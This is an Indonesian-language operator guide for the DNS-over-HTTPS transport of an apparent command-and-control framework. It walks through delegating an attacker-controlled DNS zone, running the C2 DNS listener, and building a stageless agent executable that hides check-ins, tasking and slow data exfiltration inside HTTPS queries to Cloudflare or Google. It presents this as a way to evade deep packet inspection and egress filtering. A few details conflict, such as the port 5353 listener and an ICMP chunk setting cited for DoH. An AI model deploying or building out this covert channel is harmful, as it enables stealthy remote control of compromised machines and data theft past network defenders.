# Transport: DNS-over-HTTPS (DoH)

Agent mengirim data C2 yang diencode sebagai DNS TXT query, dikirim ke **public DoH resolver** (Cloudflare atau Google), yang meneruskannya ke **authoritative DNS zone** yang kamu kontrol. Server C2 berjalan sebagai authoritative DNS untuk zone tersebut dan menjawab dengan command yang diencode.

---

## Kapan Dipakai

- Target environment yang block semua outbound kecuali DNS (port 53/UDP) atau HTTPS ke Cloudflare (port 443)
- Network yang melakukan deep packet inspection — DoH terlihat seperti HTTPS request ke `1.1.1.1` atau `8.8.8.8`
- Exfiltration pelan di environment sangat restricted

> **OPSEC note**: DoH tidak terlihat seperti custom protocol — traffic ke `1.1.1.1:443` adalah hal umum. Kelemahannya: bandwidth sangat terbatas (~200 bytes per query), dan latency tinggi (beberapa detik per command). Bukan untuk interactive session, tapi bagus untuk async tasking.

---

## Arsitektur

```
[Agent] --HTTPS POST--> [Cloudflare/Google DoH :443]
                                    |
                          (resolve TXT query)
                                    |
                                    v
                        [Authoritative DNS Server (C2)]
                               :5353 UDP
```

Data flow:
1. Agent encode payload sebagai DNS label (base32)
2. Agent query `<encoded-data>.tunnel.example.com` type TXT via Cloudflare DoH
3. Cloudflare forward ke authoritative NS untuk `tunnel.example.com` (server C2 kamu)
4. Server decode data, proses, respond dengan command sebagai TXT record (base32)
5. Cloudflare return TXT response ke agent
6. Agent decode TXT response

---

## Prasyarat: Setup Authoritative DNS Zone

Ini satu-satunya transport yang butuh **domain publik**. Tanpa ini, DoH tidak bisa jalan.

### 1. Beli domain dan set NS records

Di registrar domain kamu (Namecheap, GoDaddy, Cloudflare, dst), set NS record untuk subdomain ke server C2:

```
tunnel.example.com.  NS  ns1.example.com.
ns1.example.com.     A   <IP-server-C2>
```

Artinya: semua DNS query untuk `*.tunnel.example.com` akan diarahkan ke server C2 kamu.

### 2. Buka port DNS di server

```bash
# Jika server di Linux — buka UDP 5353 (non-root)
sudo ufw allow 5353/udp

# Atau untuk port 53 (perlu root)
sudo ufw allow 53/udp
```

### 3. Test NS delegation dari internet

```bash
# Dari mesin LAIN (bukan server C2), verifikasi NS delegation
dig NS tunnel.example.com @8.8.8.8
# Harus return: tunnel.example.com.  NS  ns1.example.com.

# Test query ke authoritative server langsung
dig TXT test.tunnel.example.com @<IP-server-C2> -p 5353
```

---

## Step 1 — Start Server (DoH / DNS listener)

Server jalankan DNS listener untuk menjawab query dari Cloudflare/Google:

```bash
ENCRYPTION_KEY=MySecretKey32Chars00000000000000 \
  go run ./cmd/server \
  --dns \
  --dns-domain tunnel.example.com \
  --dns-port 5353 \
  -port 8080
```

| Flag | Env | Default | Keterangan |
|------|-----|---------|-----------|
| `--dns` | `$DNS_ENABLED` | `false` | Aktifkan DNS listener |
| `--dns-domain` | `$DNS_DOMAIN` | (required) | Zone authoritative yang kamu kontrol |
| `--dns-port` | `$DNS_PORT` | `5353` | UDP port DNS listener. Untuk port 53: jalankan dengan sudo atau DNAT |

**Expected log:**
```
  [✓]  DNS listener  ·  udp://0.0.0.0:5353  zone=tunnel.example.com
  [✓]  ready  ·  listening on 0.0.0.0:8080
```

### Gunakan port 53 (production)

Port 53 butuh root atau special capability:

```bash
# Opsi 1: jalankan dengan sudo
sudo ENCRYPTION_KEY=... go run ./cmd/server --dns --dns-domain ... --dns-port 53

# Opsi 2: DNAT iptables (lebih OPSEC — proses tetap non-root)
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353
sudo iptables -t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-port 5353
ENCRYPTION_KEY=... go run ./cmd/server --dns --dns-domain ... --dns-port 5353
```

---

## Step 2 — Generate Agent (DoH)

```bash
# Via Cloudflare DoH (default)
go run ./cmd/generate/ stageless \
  --c2 https://fallback.example.com \
  --key MySecretKey32Chars00000000000000 \
  --transport doh \
  --doh-domain tunnel.example.com \
  --doh-provider cloudflare \
  --output bin/agent_doh.exe

# Via Google DoH
go run ./cmd/generate/ stageless \
  --c2 https://fallback.example.com \
  --key MySecretKey32Chars00000000000000 \
  --transport doh \
  --doh-domain tunnel.example.com \
  --doh-provider google \
  --output bin/agent_doh_google.exe
```

| Flag | Default | Keterangan |
|------|---------|-----------|
| `--transport doh` | — | **Wajib** untuk DoH transport |
| `--doh-domain` | — | **Wajib** — zone authoritative kamu |
| `--doh-provider` | `cloudflare` | Resolver: `cloudflare` (1.1.1.1) atau `google` (8.8.8.8) |
| `--c2` | — | Tetap wajib — dipakai sebagai fallback dan untuk ECDH key exchange initial |

> **Catatan**: `--c2` tetap harus berisi URL yang valid. Untuk pure-DoH tanpa HTTP fallback, set ke domain C2 kamu (tidak harus reachable via HTTP, tapi harus bisa di-resolve).

---

## Step 3 — Verify Checkin

### Test DNS query dulu (sebelum jalankan agent)

```bash
# Dari target machine (atau mesin yang simulate target)
# Encode "test" sebagai base32 DNS query manual
curl -s "https://cloudflare-dns.com/dns-query?name=ORSXG5A.tunnel.example.com&type=TXT" \
  -H "accept: application/dns-json"
```

Server harus log request masuk:
```
[*] DNS query: ORSXG5A.tunnel.example.com  type=TXT
```

### Jalankan agent

```
[+] Agent checkin (DoH): <agent-id>  DESKTOP-ABC  user
```

Checkin via DoH lebih lambat dari HTTP (3-10 detik) — normal karena ada 2x DNS resolution chain.

---

## Step 4 — Verify Traffic di Wireshark

### Di target machine (agent side)

Filter:
```
ip.dst == 1.1.1.1 && tcp.port == 443
```

Yang terlihat: HTTPS POST ke `1.1.1.1:443` dengan path `/dns-query?name=...&type=TXT`. Traffic identik dengan browser yang resolve DNS biasa — tidak ada signature khusus C2.

Inspect query name (setelah decrypt TLS jika punya key):
```
name=ABCDEFGHIJK...LMNOPQRSTU.tunnel.example.com
```
Bagian sebelum `.tunnel.example.com` adalah base32 payload agent.

### Di server C2 (DNS listener)

```bash
sudo tcpdump -i eth0 -n udp port 5353
```

Output:
```
IP <cloudflare-ip>.50xxx > <server-ip>.5353: 12345+ TXT? ABCDE....tunnel.example.com.
IP <server-ip>.5353 > <cloudflare-ip>.50xxx: 12345 1/0/0 TXT "ONSWG..."
```

---

## Step 5 — Verify Encryption

DoH payload sudah di-encode base32, tapi konten tetap harus terenkripsi AES-GCM. Untuk verify:

```bash
# Di server, decode TXT query manual
python3 -c "
import base64, sys
label = sys.argv[1].upper().replace('.', '')
data = base64.b32decode(label + '=' * (-len(label) % 8))
print(repr(data[:50]))
" "ABCDEFGH..."
```

Output harus berupa bytes random (ciphertext), bukan JSON plaintext.

---

## Wire Format Detail

**Agent → Cloudflare → Server (DNS TXT query):**
```
Query name: <base32(JSON-envelope)>.tunnel.example.com  TYPE TXT
```

JSON envelope sebelum encode:
```json
{"t": "c", "a": "<agent-id>", "d": "<base64-AES-ciphertext>"}
```
- `"t"`: `c`=checkin, `r`=result, `p`=poll
- Payload di-split jadi label 63-char max, joined dengan `.`

**Server → Cloudflare → Agent (TXT response):**
```
TXT value: <base32(JSON-response)>
```

JSON response:
```json
{"s": "ok"}                             // checkin/result diterima
{"s": "noop"}                           // poll, tidak ada command
{"s": "cmd", "c": <encrypted-command>}  // push command
```

---

## Troubleshooting

| Symptom | Penyebab | Solusi |
|---------|----------|--------|
| Agent tidak checkin, tidak ada log di server | NS delegation belum propagate | Tunggu 24-48 jam propagasi atau cek dengan `dig NS tunnel.example.com @8.8.8.8` |
| DNS query masuk ke server tapi malformed | `--doh-domain` di agent tidak match `--dns-domain` di server | Harus identik: `tunnel.example.com` == `tunnel.example.com` |
| `RCodeNameError` di server log | Query zone salah (bukan subdomain dari `--dns-domain`) | Bug di agent DOH domain config |
| `RCodeFormatError` di server log | Payload terlalu besar untuk single DNS label | Normal untuk payload besar — agent seharusnya chunk. Cek `icmp_chunk_size` |
| Latency sangat tinggi (>30s per command) | Cloudflare caching TXT negative responses | Pakai TTL rendah di NS record (60s), atau pake Google DoH sbg alternatif |
| Server tidak terima query (port 5353) | Firewall block UDP 5353 atau Cloudflare query ke port 53 bukan 5353 | Cek apakah NS delegation benar mengarah ke port 53; pakai DNAT untuk forward port 53 → 5353 |
